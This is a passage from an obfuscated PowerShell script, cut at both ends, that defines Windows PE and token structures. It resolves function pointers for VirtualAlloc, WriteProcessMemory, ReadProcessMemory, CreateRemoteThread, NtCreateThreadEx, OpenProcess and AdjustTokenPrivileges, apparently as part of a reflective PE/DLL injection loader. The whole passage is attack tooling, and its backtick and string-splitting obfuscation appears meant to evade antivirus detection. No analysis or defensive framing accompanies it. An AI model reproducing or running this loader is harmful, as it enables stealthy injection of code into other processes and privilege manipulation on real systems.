${N`ULL} =  ${t`B}."d`efiNEfi`e`ld"(  ( 'Ba'+ 's' )+  'e', [UInt32], (  'Pu'  + 'b' )  +  (  'l' +'ic'  ) )
${n`UlL}  = ${t`B}."d`eFIne`FIELD"( ( 'N'  + 'um')+ ('b' + 'er' )+  ( 'O'  + 'fF'  )+('u'+'nc' )+ ('ti'+  'ons'  ), [UInt32], (  'Pu' +  'b'  )+  ('l' +'ic'  )  )
${n`UlL} =  ${tB}."d`eFIne`FIe`Ld"(  (  'Nu' + 'm'  ) +(  'b'  +'er'  )+ ( 'O'+'fN')  + ( 'a' +'mes' ), [UInt32], ( 'Pu'  +  'b'  )+(  'li' + 'c' ))
${n`ULl}  =  ${tb}."D`EFinefI`ElD"(('A' +  'dd') +(  'r'  + 'es'  )+('s'  +'OfF' ) + ( 'u'+'nc') + (  'tion'  +'s'), [UInt32], ('Pu'  + 'b'  )  + (  'li'  + 'c'))
${n`ULL} =  ${TB}."DE`FI`Nefie`LD"( ('A' + 'dd') +('re'  +  's' ) +(  'sO'+  'fN' ) +  (  'ame' + 's'  ), [UInt32], (  'Pu'+'b' )  +  ('l'+  'ic') )
${Nu`lL}  =   ${TB}."d`EfI`NEFiELd"(  (  'A'+'dd'  )+( 're'+'s'  ) +(  'sOf' +  'N') + (  'am'+'eO' )  +  ('rd'+  'in') + (  'a'  + 'ls'), [UInt32], ('Pu'  +'b')+  ( 'l'+'ic' )  )

    ${I`eDEP}   =   ${Tb}."c`REaTe`Type"( )
    ${_}   |  aM -MemberType $('No'+  'te'  +'P'+ 'r'  +  'op'+  'e'  + 'r' + 'ty'  ) -Name $('IM' + 'AG' +  'E_' +  'EX'  + 'PO'+  (  'R' + 'T_') +  'DI'  + 'RE'+'CT' + 'OR' + 'Y' ) -Value ${I`EDeP}

${T`B}   =  ${mB`er}."d`Efine`TypE"(  (  'L'+  'UI')  +'D', ${a`TR}, [System.ValueType], 8)
${n`Ull}  = ${tB}."DEfIN`efiE`Ld"(  ('L'  +  'ow'  ) +( 'P'  + 'ar'  )+ 't', [UInt32], ( 'P' +'ub'  )+ (  'l'+'ic' ) )
${N`ULl}  =   ${TB}."dEfI`N`eFIELD"(  ('Hi' +  'g' ) + ('h' +  'Pa' )+'rt', [UInt32], (  'Pu'+ 'b'  )+ (  'li'  +  'c')  )

    ${l`UiD} =   ${T`B}."CreAt`E`TY`pe"(  )
    ${_}   |  aM -MemberType $('No'+  'te'+  'P'+  'r' + 'op'+  'e' + 'r'  +'ty' ) -Name $('LU' + 'ID' ) -Value ${lU`iD}

${tB}   = ${M`BEr}."Def`Ine`T`ype"(  ( 'LU'  + 'I') +  ( 'D_'+ 'A' )  + (  'N'  + 'D_' )+ ('AT' +'T')+  (  'R'+  'IB' )  + ( 'UT'  +'E' )  +'S', ${a`TR}, [System.ValueType], 12  )
${Nu`lL}  =  ${TB}."dEFIn`eFI`eLD"((  'Lu' + 'i' )+  'd', ${l`Uid}, (  'Pu'  + 'b') + ( 'l' +'ic')  )
${N`ULl}   =   ${TB}."dEf`InEF`IE`ld"(('A'  + 'tt' ) + (  'r'  +'ib') +(  'u' +  'te'  ) +  's', [UInt32], (  'P' + 'ub' ) +  ('l'+ 'ic'  )  )

    ${l`SN}   =  ${T`B}."CReaT`e`TyPe"(    )
    ${_} |   aM -MemberType $('No'  +  'te' + 'P'+'r' + 'op'+  'e'+'r'  +'ty') -Name $('LU'  +('I'  +  'D_')+  'AN'+ 'D_'+  'AT' +  'TR' + 'IB'  +'UT'+ 'ES'  ) -Value ${l`Sn}

${TB} =  ${m`BeR}."DeFi`Ne`TypE"(('T'+ 'OK')  + ('E'  +'N_')+ ('P' +'RI') +(  'V' + 'IL'  )+( 'E'  + 'GE'  ) +'S', ${A`TR}, [System.ValueType], 16  )
${NU`Ll}   =  ${tb}."defI`Ne`Field"(  ('P'+  'ri') + ( 'v'  +  'il')+  (  'eg' + 'e' ) +(  'Co'  +  'u' ) +  'nt', [UInt32], (  'P'+'ub')  +  ('li'+ 'c')  )
${nu`ll}  =  ${T`B}."D`Ef`iNEfIELd"((  'P'  +  'ri' )+ ('vi' +  'l'  ) + ( 'e'  +  'ge')  +'s', ${L`SN}, ('Pu' +  'b')+( 'l'+ 'ic' ) )
    ${t`ps} =  ${T`B}."cR`EaTeT`ype"( )
    ${_}  |   aM -MemberType $('No' +  'te'+ 'P'+  'r'  +  'op'+  'e' + 'r'  +'ty'  ) -Name $('TO'+'KE'  + 'N_' +  'PR' +  'IV'  +'IL'+ 'EG'+ 'ES') -Value ${T`ps}
}


            return ${W3`2T}
        }

        Function gw32C {
            ${w`32c} = nO PSOBJect

            ${p`ROp`eRT`IEs}  =  @{
                "MeM`_`cOmMiT"                            =   0x00001000
                "meM`_REs`ERve"                             = 0x00002000
                "p`AGe_no`AcceSs"                           =  0x01
                "pAGe_r`E`AdONLy"                         = 0x02
                "P`Age`_REaDWr`itE"                         = 0x04
                "P`AGe_wRi`T`ECOpY"                        = 0x08
                "P`AgE_EXEC`UTE"                          = 0x10
                "p`AGe_`E`X`E`CUtE_ReAd"                     =   0x20
                "pAG`e_EXeCu`TE_r`eAdWR`iTE"                  = 0x40
                "PAGE_`Ex`Ec`UTE_W`Ri`TE`copy"                 = 0x80
                "PA`gE`_N`OCaCHe"                            = 0x200
                "ImA`Ge_REl`_BaSEd_A`Bs`OLUtE"              =   0
                "IMAGE_`Rel_`B`As`e`d`_HIGHLoW"               =   3
                "iMag`E_Re`l_baSe`D`_DIr64"                 = 10
                "I`mAGe_s`cN_meM_Dis`caRDA`BLe"              =  0x02000000
                "iMAge`_Sc`N_MEM_eX`e`cuTE"                  =  0x20000000
                "imaG`E_Scn_m`EM`_`REAd"                     =   0x40000000
                "iMA`G`E_Scn_MeM`_`wrITe"                     =  0x80000000
                "Im`AGe_ScN_MeM_no`T`_Cac`hEd"               = 0x04000000
                "MEM`_DEC`OmM`it"                          =  0x4000
                "image_f`Il`e_EXEcU`TA`BLe_iMAgE"             =  0x0002
                "I`MAGE_fI`LE`_`dlL"                          =   0x2000
                "IM`A`GE`_dL`LchAraCtE`Ri`ST`IcS_DYNaMIc_baSE"   =   0x40
                "im`Age_D`L`LcharACTE`RistICS_Nx`_COMpaT"     =   0x100
                "MeM_r`eLE`ASE"                             = 0x8000
                "t`okEn_Q`UeRy"                             = 0x0008
                "tOk`EN_`Adj`Us`T_PR`IviLeGEs"                 =  0x0020
                "S`E_`pRIViLEGE_`e`Nabl`eD"                   =   0x2
                "E`R`ROR_no_TOkeN"                         = 0x3f0
            }

            foreach ( ${p`ROPEr`TY} in ${prO`perT`iEs}."KE`yS") {
                ${w3`2c} |   aM -MemberType $('No'+'te'  +'P'  + 'r'+'op' + 'e'  +  'r' +'ty') -Name ${PR`OPER`TY} -Value ${P`R`oPErt`IES}[${p`RO`pERty}]
            }

		
            return ${w`32c}
        }

        Function GET-W32F {
            ${W3`2f} =  nO SYStEm.OBJeCT
		
            ${V`AA} =   GET-PAD $((  'ke'  + 'r' )  +( 'n' + 'el'  ) +( '32.' + 'dl')+'l'  ) $(( 'Vi'+  'r' ) +  (  't' + 'ua'  ) +  ( 'l' + 'Al')+('l'+'oc'))
            ${V`AD}  =   GTDP @([IntPtr], [UIntPtr], [UInt32], [UInt32] ) (  [IntPtr] )
            ${V`AC} =  [System.Runtime.InteropServices.Marshal]::"get`d`eLEga`TEFoRf`Uncti`ON`pOi`NtEr"( ${V`Aa}, ${V`Ad})
            ${w3`2F}  |   aM $('No' + 'te' + 'P'  +'r'+'op'  +  'e'+  'r'  +  'ty'  ) -Name $('Vi'+'rt'  +( 'ua'+'l'  ) + (  'A'+  'll' )+'oc' )` -Value ${v`AC}
		
            ${V`AE} =  GET-PAD $(('ke' +  'r'  )  +  (  'ne'  + 'l' ) + ( '32.d'+  'l' ) + 'l' ) $(( 'V' + 'ir')+(  'tu'+  'a')  +  (  'l'  + 'Al'  ) +( 'l' + 'oc' )+  'Ex')
            ${va`eD} =  GTDP @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]  ) ( [IntPtr])
            ${vA`CEX}  = [System.Runtime.InteropServices.Marshal]::"g`et`De`LEg`A`TEF`o`RfUnCTionp`OInTer"(${V`AE}, ${v`AED} )
            ${w`32F}  | aM $('No'+ 'te'+ 'P'  +'r'  + 'op'  +  'e'  + 'r'  +'ty' ) -Name $('Vi'+ 'rt'+ ( 'ua'  + 'l' )+  ( 'A'+ 'll' )+'oc' +  'Ex') -Value ${vA`Cex}
		
            ${m`Ca}  = GET-PAD $(( 'm'  +  'sv'  )+( 'cr'+'t'  ) +  '.' +  ('d' +  'll'  ) ) $('me' +'mc'+  'py'  )
            ${M`CD}   =  GTDP @([IntPtr], [IntPtr], [UIntPtr]  ) ( [IntPtr] )
            ${m`cy}   =  [System.Runtime.InteropServices.Marshal]::"geT`dELEG`ATef`ORFUNctIoNP`OintEr"(  ${m`Ca}, ${M`cD}  )
            ${W3`2f}  |  aM -MemberType $('No' + 'te'  + 'P' +  'r'  +'op'  +  'e' + 'r'  +  'ty' ) -Name $('m'  +  'em' +  (  'c'+ 'py'  )  ) -Value ${m`Cy}
		
            ${m`sA} = GET-PAD $(( 'ms'  + 'v')  +  ( 'cr'  +  't')+  '.'  +  (  'dl'  +  'l' ) ) $('me' +  'ms'+  'et' )
            ${M`sD}  = GTDP @([IntPtr], [Int32], [IntPtr]  ) ([IntPtr]  )
            ${M`St} =  [System.Runtime.InteropServices.Marshal]::"Getdele`gateFo`Rf`U`NctiONp`oiNter"(  ${m`Sa}, ${M`SD})
            ${W`32F}   | aM -MemberType $('No'  + 'te'+  'P' + 'r' + 'op' + 'e'  +'r' +'ty' ) -Name $('me' +'m'  + ('se' +'t')) -Value ${m`st}
		
            ${l`la}   = GET-PAD $(('ke' +'r'  )  +  ('n'+ 'el'  ) +  (  '32.'+  'dl') +  'l' ) $(( 'L'  +'oa' )  +  (  'dL' + 'i') +  ('br'  +  'a' )  +  ('r'  +  'yA' )  )
            ${l`lD} =   GTDP @([String]  ) (  [IntPtr])
            ${lo`A`dlibRary} =  [System.Runtime.InteropServices.Marshal]::"geTDElEgATE`F`o`RFU`NC`TI`ONP`oi`NtER"(${l`la}, ${L`lD})
            ${W3`2F}   | aM -MemberType $('No' + 'te'+'P'+  'r'+ 'op' +'e'+ 'r'  +'ty') -Name $(('L'+  'oa'  )  + ('d'  + 'Libra' ) + 'ry'  ) -Value ${LoA`dL`IBR`ARY}
		
            ${g`pAa`dDR} =  GET-PAD $(( 'k' +  'er' )+  (  'ne'+  'l' )+  ( '32.d'  +  'l' )+ 'l'  ) $((  'Ge'  +'t'  )  +'Pr'  + (  'oc'  +  'A'  )+  (  'dd'+  'r') +  ('e' + 'ss' )  )
            ${gpa`D`elEGAte}  =  GTDP @([IntPtr], [String]) (  [IntPtr] )
            ${G`Pa}  =  [System.Runtime.InteropServices.Marshal]::"Ge`Td`ELeG`A`TEfOrFUNCtIONpoI`Nt`ER"( ${GpAAd`dr}, ${G`PAdELE`GA`Te} )
            ${w3`2F}  | aM -MemberType $('No'+ 'te'  +'P'+'r' + 'op'+'e'+  'r' +  'ty') -Name $((  'Ge' + 't'  )  +  ('P' +'roc')+  ( 'A'+  'dd'  )  +('re'  +'ss'  )) -Value ${G`PA}
		
            ${g`PAoR`DInAL`AddR} = GET-PAD $(( 'k' + 'er' ) +  ('n'  +'el'  ) +('3'  + '2.dl'  )  +'l'  ) $((  'G'  +'et') + 'Pr'  +(  'o'+ 'cA')  +('dd' +  'r') +(  'es' + 's'  )  )
            ${gPA`oR`D`inaldElEgATe} = GTDP @([IntPtr], [IntPtr] ) ([IntPtr] )
            ${g`P`A`ORDInAL}  = [System.Runtime.InteropServices.Marshal]::"GE`Td`eLEgA`TE`FORFUNc`TIO`NPOinteR"(${gP`AoR`DinALaddR}, ${gpAORdin`A`l`DelEGaTe} )
            ${w3`2f}   |  aM -MemberType $('No'  +  'te'  + 'P' + 'r'  +  'op'  + 'e'  +'r'  +  'ty') -Name $((  'Ge' +  't')  + ( 'Pro' +'c')  + ('A'+  'dd') +( 're' + 'ssOr' ) +(  'dina' + 'l'  ) ) -Value ${GP`AO`R`dINaL}
		
            ${V`FA}   =  GET-PAD $(( 'k'  + 'er' )  +( 'n' + 'el'  )  +(  '32.' +  'dl'  ) +'l'  ) $((  'V' +'ir' ) +  ( 'tu'+'a' )+(  'l'+  'Fr'  )  + 'ee' )
            ${v`FD}  =   GTDP @([IntPtr], [UIntPtr], [UInt32]  ) (  [Bool]  )
            ${v`F3} = [System.Runtime.InteropServices.Marshal]::"GetDe`lEg`A`TEfOr`F`UN`ctIo`NPOiN`TeR"(${v`FA}, ${v`Fd}  )
            ${W3`2f} | aM $('No'  +'te'+  'P' +  'r'+ 'op'+'e'  + 'r'+  'ty' ) -Name $('Vi' +'rt'  + ( 'ua'+  'l'  )  + (  'F' + 'ree')) -Value ${v`F3}
		
            ${vf3`exAD`dR} =   GET-PAD $(( 'ke'+'r'  )  +(  'ne' +'l') +  ( '32.' +  'dl')+ 'l') $((  'Vi' +'r'  ) + ('tu'+'a' ) + (  'lF' +'r'  ) +('ee'  +'E' ) +  'x')
            ${v`F3`eX`DelegATE}  =  GTDP @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ( [Bool] )
            ${v`F3Ex} = [System.Runtime.InteropServices.Marshal]::"GeTd`eLEgaTEfo`RfuNc`TIONpOI`N`Ter"(  ${vf3`eXa`Ddr}, ${Vf3EXd`eLEg`ATe} )
            ${w`32F} |   aM $('No' +'te' +'P' +  'r'+  'op'  +'e'+'r' +'ty') -Name $('Vi' + 'rt' +  ('ua' + 'l') + ('Fre' +  'e' )+ 'Ex') -Value ${vf3`Ex}
		
            ${v`pa}  =  GET-PAD $(( 'ke' +  'r' ) +  ('n' +'el' )  + ('3' +'2.dl' )  + 'l' ) $(( 'V'  +  'ir' )+  ('t'+'ua'  )+( 'lP' +  'r' )+ 'ot' +  (  'ec'  + 't' ))
            ${V`PD}   =   GTDP @([IntPtr], [UIntPtr], [UInt32], [UInt32]."mak`EbyRE`FtYpE"(  ) ) ([Bool] )
            ${V`pt}   =   [System.Runtime.InteropServices.Marshal]::"GE`T`dElegAtefo`RFuN`CT`ION`P`oInT`Er"(${V`pa}, ${V`Pd} )
            ${w3`2F}   |   aM $('No'+'te' + 'P'  +  'r'+  'op'  +'e' +'r' +  'ty' ) -Name $('Vi'+ 'rt' + ('ua' +  'l' ) +  (  'P'  +'ro' )  +'te' +'ct') -Value ${V`pT}
		
            ${GMa`ha}   =   GET-PAD $(( 'ke' +'r'  )+  ( 'n'+'el')+ (  '32.d'  +'l'  ) +  'l'  ) $(('Ge'  +  't'  )  +( 'Mo'  +'d')+'ul'+  ('eH'+  'a' )  +'nd'  + (  'le'  +  'A'))
            ${G`Ma`HAd}  =   GTDP @([String]) ( [IntPtr] )
            ${J`FN_`Fj}   =  [System.Runtime.InteropServices.Marshal]::"gETdeleG`AT`EFor`F`UNCtIONPOI`NT`Er"( ${G`MaHa}, ${gmA`H`Ad}  )
            ${W3`2f} |   aM $('No'  +  'te'+  'P' + 'r'+'op'  + 'e' + 'r'+  'ty' ) -Name $(( 'Ge' +  't' )+  ( 'Mod' +'ul'+  'e'  )+('Ha' +  'n'  +  'dle') ) -Value ${J`Fn_`FJ}
		
            ${F`lA2}   = GET-PAD $(('ke'+  'r' )+  ( 'ne'  + 'l'  )+( '32.'  +'dl' )+'l' ) $(('F'+ 're' ) +  ( 'e'  + 'Li' )  +'br'  +  (  'ar' +'y')  )
            ${f`lA`2d}   =   GTDP @([Bool]) ( [IntPtr] )
            ${fRe`ELIBR`Ary}   =  [System.Runtime.InteropServices.Marshal]::"geTd`ELE`gA`TEf`ORFUnctIoNpOiNT`er"(${fl`A2}, ${flA`2D})
            ${W`32F} |  aM -MemberType $('No'+ 'te'  + 'P'+ 'r'+  'op'  + 'e'  +  'r'  + 'ty') -Name $(('Fre' +'e')+ ( 'Lib'+  'ra'  )  +  'ry'  ) -Value ${FreE`lIbR`A`RY}
		
            ${o`Pa1}  =   GET-PAD $((  'ke'  +  'r' )+(  'ne' + 'l'  )+ ('3' + '2.dl' )+  'l' ) $(('O' + 'pe')  + (  'nP' +  'r' )  +'oc'+ ('e' +'ss')  )
            ${O`pA1d}   =   GTDP @([UInt32], [Bool], [UInt32]) (  [IntPtr]  )
            ${P`Roc`eZ`zOPe} =  [System.Runtime.InteropServices.Marshal]::"gETde`L`EgateF`O`R`FUN`ct`IONpoINT`ER"(${OP`A1}, ${oP`A1d} )
            ${W3`2F}  | aM -MemberType $('No'+ 'te'+  'P'+  'r'  +'op'+ 'e'  + 'r'+  'ty' ) -Name $((  'Op'  +'e'  ) +  (  'n'  +  'Pro'  ) +  ( 'ces' + 's' )  ) -Value ${PrOC`eZzO`PE}
		
            ${wF`s`A1}  =  GET-PAD $((  'k' +'er')+  (  'ne'  +'l' ) +  ('3'+ '2.dl' )  +  'l'  ) $(('W'  + 'ai'  )  +('t' + 'Fo')+('r'  +'Si' ) +  (  'n'  +  'gl')+  ( 'e' + 'Ob') +(  'j'  + 'ect' ))
            ${WF`sa`1D}  = GTDP @([IntPtr], [UInt32] ) (  [UInt32]  )
            ${w8`4`sO} = [System.Runtime.InteropServices.Marshal]::"gEtDEleg`At`E`FoR`FUN`CTionPOiNteR"(  ${W`FS`A1}, ${wF`s`A1D})
            ${w3`2F} |  aM -MemberType $('No' + 'te' + 'P' +  'r' + 'op'  + 'e'+'r'+'ty') -Name $(( 'Wai'+  't'  ) + ('Fo'+  'r') +  ('Sing'+  'le')+ ( 'Obj' +'ect')  ) -Value ${w8`4SO}
		
            ${w`pmA1} =   GET-PAD $((  'ke'  +  'r') +('ne'+ 'l')+  ( '32'+'.dl')  +'l' ) $(('W'  + 'ri') +  (  't'  + 'eP') +( 'ro'+  'c' )+  ( 'e'+'ss'  )+ (  'M' +'em'  )+ (  'or' + 'y' ))
            ${w`pMa`1D} = GTDP @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr]."ma`kE`B`YrefTyPE"()  ) (  [Bool] )
            ${wriP`Md} = [System.Runtime.InteropServices.Marshal]::"GeTdELeg`ATEF`O`RFu`Nc`T`i`oN`PoiNter"(${w`P`mA1}, ${WpM`A1d} )
            ${w3`2f}  |  aM -MemberType $('No' +  'te'  +'P'+'r'+ 'op'+'e' +  'r'+'ty') -Name $((  'Writ'  +  'e' ) +  ( 'P' +  'ro' ) + ('ce'  + 'ss' )+ ('M'  + 'emory' )) -Value ${WRi`Pmd}
		
            ${rp`mA1} = GET-PAD $((  'k'  +  'er'  )  + ( 'ne' +'l'  )  +  ( '32' + '.dl' )+ 'l') $((  'R'  +'ea'  ) + ( 'dP' +  'r')+  'oc'  + ( 'e' +  'ss')  + (  'Me' +'m'  )  + ('or'  +'y'  ) )
            ${RP`Ma1d}   =   GTDP @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr]."MAKEB`Yref`TypE"( )) ([Bool]  )
            ${reEDpR`o`mE}  =  [System.Runtime.InteropServices.Marshal]::"GeTdeL`eGAte`ForFUnCt`io`NP`oInT`ER"(  ${rPM`A1}, ${rpM`A`1D} )
            ${W`32F} |   aM -MemberType $('No'  +  'te'  +  'P'  +  'r' + 'op'  + 'e'  +  'r'+'ty' ) -Name $(('R'  +  'ea'  )  + (  'dPro'+ 'c' )  +( 'ess'  +'M' +  'em' ) +( 'or'  +'y' )) -Value ${R`eed`pRO`mE}
		
            ${cR`8R`Ta1} =  GET-PAD $((  'ke'+'r') +(  'ne'+  'l') +  ( '3'+  '2.dl'  )  + 'l') $((  'C'+'re'  )+(  'a'  + 'te' )  +(  'R' +  'em'  )+ ( 'o'  +  'te'  )+ 'Th'+( 'r'  +'ea'  )  +  'd'  )
            ${C`R8R`TA1d} =   GTDP @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr] )
            ${J`EC}  =  [System.Runtime.InteropServices.Marshal]::"gETdE`lE`gAteFORFUnc`TIonP`O`Int`Er"( ${cr8`RTa1}, ${CR`8`Rta1d} )
            ${W`32f} | aM -MemberType $('No'  +  'te'+  'P'+  'r'+'op' +'e'+  'r' + 'ty') -Name $('C'  +( 're'+ 'a'  )  + 'te' +'Re'+'mo' +'te'  +  ( 'Th' +'read'  ) ) -Value ${J`eC}
		
            ${g`E`CTa1}   =   GET-PAD $((  'ke' +'r' )+ ('ne'  +'l'  )+(  '32.d'  +  'l' )+ 'l' ) $(( 'Ge' +'t'  )+ (  'Ex'  + 'i'  )  +(  't'  + 'Co'  ) +  ('de' +'T')  +  (  'hr' + 'e'  )+'ad'  )
            ${gE`cT`A1d} =  GTDP @([IntPtr], [Int32]."MaKebyRE`F`T`ypE"( ) ) ([Bool] )
            ${h`cB`SM} =   [System.Runtime.InteropServices.Marshal]::"g`E`T`DEle`G`At`EfO`RFUNCTiONPOiN`Ter"(${gECT`A1}, ${GEcTa`1D})
            ${W`32F} |   aM -MemberType $('No' + 'te'  +'P'  +  'r' +  'op' + 'e'+  'r'+  'ty') -Name $(( 'G' +'et')  + 'Ex' + 'it'  + ( 'C'  +  'ode') +  ('Th'  + 'r'+  'ead')) -Value ${h`C`BSM}
		
            ${oT`T`A1} =  GET-PAD $(( 'Ad' +'v'  )+('ap' +  'i' ) + ( '3'+  '2.d'  ) + 'll') $(( 'Op'+'e'  )  +  (  'nT'  +  'h'  )+ 're'+  (  'a' + 'dT'  ) + ('o'  +'ke')  +'n' )
            ${OTt`A1D}   =  GTDP @([IntPtr], [UInt32], [Bool], [IntPtr]."mAk`ebyRE`FT`YPe"(   )  ) ([Bool])
            ${Jh`SN}   =   [System.Runtime.InteropServices.Marshal]::"G`eTdE`legAT`EFOrf`Un`Ct`IoNpoinT`er"(  ${O`TTa1}, ${ott`A1d}  )
            ${W3`2f} | aM -MemberType $('No'+ 'te' +  'P' +'r'+'op'+'e'  +  'r'  +  'ty' ) -Name $((  'O' +'pe' )+ ('n'+'Th')+ ( 're' +  'a'  )+ ('d' + 'To'  ) +(  'ke' +  'n')) -Value ${jh`sn}
		
            ${g`ctA`1eR}  =   GET-PAD $(('k' +'er'  )  + ( 'n' + 'el') +('32.'  + 'dl' ) + 'l' ) $((  'Ge' +'t')  + ( 'C'+ 'ur')+  (  'r'  +  'en')  +  ('tT' +  'h' ) + ( 'r'  +'ea'  )  + 'd' )
            ${g`Cta1`eRD} =   GTDP @(  ) ( [IntPtr])
            ${UCN`dm} =   [System.Runtime.InteropServices.Marshal]::"GetdelegaTE`F`o`R`FUNcTI`OnpoI`NT`Er"( ${gcT`A1`ER}, ${g`ct`A1`ERd} )
            ${w3`2f}   | aM -MemberType $('No'  +'te'  + 'P'  + 'r' +  'op' + 'e'+  'r'  + 'ty' ) -Name $(( 'Ge' +'t'  ) +(  'Cu' +'r'  )  +  ('r' +'ent' )+ ('Th'+'re') + 'ad' ) -Value ${uC`NDm}
		
            ${at`PA1}  =   GET-PAD $((  'Ad'+ 'v' ) +  ('ap' +  'i')+ (  '32'+'.d'  ) +'ll' ) $((  'A'+ 'dj')  +('us'  + 't'  )+  ('T'  +'ok' ) +( 'e'  + 'nP'  )  +( 'ri'+'v') + ( 'i' + 'le' )  +  ( 'g'  +  'es' ) )
            ${aT`pa1d}  =   GTDP @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]  ) ( [Bool] )
            ${leL`dN`N`NNf}  = [System.Runtime.InteropServices.Marshal]::"get`DEL`E`g`AT`efOrFuNcT`ioNpOiN`T`eR"(  ${aTP`A1}, ${A`Tpa1d})
            ${w3`2f} |  aM -MemberType $('No' +  'te'+ 'P'+'r'  +'op'+'e'  +  'r'+'ty'  ) -Name $('Ad'+( 'jus'+'t'  ) +  'To'+ ( 'k'  + 'en' )+  (  'P'  + 'ri' )+( 'vileg' +'es'  ) ) -Value ${LELDnN`N`Nf}
		
            ${lPv`A1}  =  GET-PAD $(( 'A'+ 'dv') + (  'a'  +'pi'  ) +(  '3' +'2.d' )+ 'll'  ) $(('L'+ 'oo'  )+ ('ku' +'p'  )+ (  'Pr'+'i')  +  (  'vi'  +  'l' )+( 'e'+'ge' )+('V' + 'al'  )+ ( 'u'  +  'eA'))
            ${l`pVA1d} = GTDP @([String], [String], [IntPtr] ) ( [Bool] )
            ${ld`ME}  =   [System.Runtime.InteropServices.Marshal]::"get`DElEgat`E`FORf`UncTIoNPoiNT`er"(${l`pva1}, ${Lp`VA1D})
            ${W`32f}   |   aM -MemberType $('No'  +  'te'  +  'P'+  'r'+ 'op' +  'e' +'r'+  'ty' ) -Name $(('L' +  'ook'  ) +'up' +  ('Pr'  + 'i')+(  'vi' + 'lege') +(  'V'  + 'alue'  )  ) -Value ${LD`Me}
		
            ${I`SA1}   =  GET-PAD $(('Ad'+'v' )  +  ('a'+ 'pi'  ) + (  '32.'  +'d'  )+  'll' ) $(('Im' + 'p')+('er'  + 's') +  ('on' +'a') + ('te'+ 'S' ) +  ( 'el' +'f')  )
            ${is`A1d}  =  GTDP @([Int32]  ) ( [Bool]  )
            ${j`m`AGD}   =  [System.Runtime.InteropServices.Marshal]::"Ge`T`DELegaTEFo`R`FuNCtI`On`p`oiNt`ER"(  ${I`SA1}, ${i`sa`1D} )
            ${W`32F} |  aM -MemberType $('No'  + 'te'+'P'  +'r'  +'op' +  'e' + 'r'  +  'ty' ) -Name $('Im' + ('p'+  'er' )  +  ('so' +'n')+( 'a'+ 'te') +(  'Se'+'lf' )  ) -Value ${jMa`Gd}
		
			
            if ((  [Environment]::"oSvER`si`on"."ve`RS`ioN" -ge (  nO (  'Ve'+'rsio' + 'n' ) 6, 0  ) ) -and (  [Environment]::"Osve`Rsi`on"."Ver`SiON" -lt (nO ('V'  + 'e'  +  'rsion' ) 6, 2  )  )  ) {
                ${Nc`TEa1}   =  GET-PAD $(( 'Nt' +'D'  ) +  ( 'l'+'l.d'  ) +  'll'  ) $((  'Nt' +'C') + ( 'r' + 'ea')  +  ('t'  +'eT'  )+  ('hr'+  'e' )  +( 'ad'+ 'E')  +  'x' )
                ${Nc`TE`A1d} =   GTDP @([IntPtr]."MakEBy`ReFt`Ype"(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ( [UInt32] )
                ${kJ`Nd} = [System.Runtime.InteropServices.Marshal]::"geT`dE`le`gA`TEf`OrfuN`C`TIoNpOinter"(  ${Nc`Tea1}, ${nCt`eA1d})
                ${w`32F}   |  aM -MemberType $('No'+  'te'+ 'P'+'r' +'op'  + 'e' +  'r' +'ty' ) -Name $('Nt'  +  ('Creat'+'e' )  + 'Th'  +  ('rea'+ 'd' )+  'Ex') -Value ${Kj`ND}
            }
		
            ${I`w`6pa}  = GET-PAD $(('K'+  'er'  )+(  'n' +'el' )+  (  '32' +  '.d' )  +  'll'  ) $(( 'Is'+  'W'  )+( 'ow'+  '6')+('4'  + 'Pr')  +(  'o'  +  'ce')+  'ss')
            ${IW`6P`AD} =   GTDP @([IntPtr], [Bool]."MA`ke`ByREFTyPE"()  ) (  [Bool]  )
            ${uk`NDb}  =   [System.Runtime.InteropServices.Marshal]::"g`ETD`ELegatefor`F`UncT`IonP`OiNt`ER"(  ${i`W6`pA}, ${IW6`PAD}  )
            ${w3`2f}   | aM -MemberType $('No' + 'te' + 'P'  +'r'+ 'op'  +'e' + 'r'+'ty' ) -Name $('Is'+'Wo' +  'w'  +'64' +  (  'Pr'+ 'o'  )  +  (  'ce'  + 'ss'  )) -Value ${uK`NdB}
		
            ${CT`A1}  =   GET-PAD $(( 'Ke'  +'r')+( 'n'+ 'el')  +  (  '32.'  + 'd'  ) + 'll'  ) $(( 'Cr' +'e' )+  ('a'+'te') +('Thr'+'e'  ) +  'ad' )
            ${c`Ta`1d} =  GTDP @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32]."MakebY`R`Eft`YPe"(    )  ) (  [IntPtr]  )
            ${lop`sJ}  =  [System.Runtime.InteropServices.Marshal]::"GE`TDEleg`ATeForF`Unct`IO`NP`OI`N`TEr"(${Ct`A1}, ${c`Ta`1d})
            ${W`32F}   |  aM -MemberType $('No'+'te' +  'P'+ 'r' +  'op'  +  'e'  + 'r'+  'ty' ) -Name $('C'  +  (  're' + 'a' ) +'te' +  (  'T'+  'hre')  +  'ad') -Value ${lo`psj}
	
            ${l`FA1}   =   GET-PAD $((  'ke'  + 'r'  )+ ( 'n'  +  'el' ) +(  '3'+'2.d')+  'll') $(( 'Vi' + 'r')+( 'tu' +  'a'  )+('lF' +'r'  )  + 'ee'  )
            ${L`FA1D}   = GTDP @([IntPtr]  )
            ${lod`ND} = [System.Runtime.InteropServices.Marshal]::"gETdE`legaTe`Fo`RfUnctIOn`poinTer"( ${l`FA1}, ${Lf`A1D} )
            ${W`32f}   |  aM $('No'  +'te'  +  'P'  + 'r' + 'op'+'e'  +'r'  + 'ty'  ) -Name $(('L'  + 'oc'  )+'al'+('Fr'  +  'ee') ) -Value ${lod`Nd}

            return ${w3`2F}
        }
		

			
		
        Function sSIAU{
            Param( 
                [Parameter( POSITion =   0, MaNDAToRy  = ${tR`Ue} )]
                [Int64]
                ${V`1},
		
                [Parameter(posiTION   =   1, maNdAtORy   =   ${tr`UE})]
                [Int64]
                ${V2}
            )
		
            [Byte[]]${V`1B}   = [BitConverter]::"GEtbY`TEs"(  ${v1})
            [Byte[]]${V`2b}  = [BitConverter]::"G`EtbyT`Es"(${v`2} )
            [Byte[]]${fB}   = [BitConverter]::"G`e`TbYTes"( [UInt64]0  )

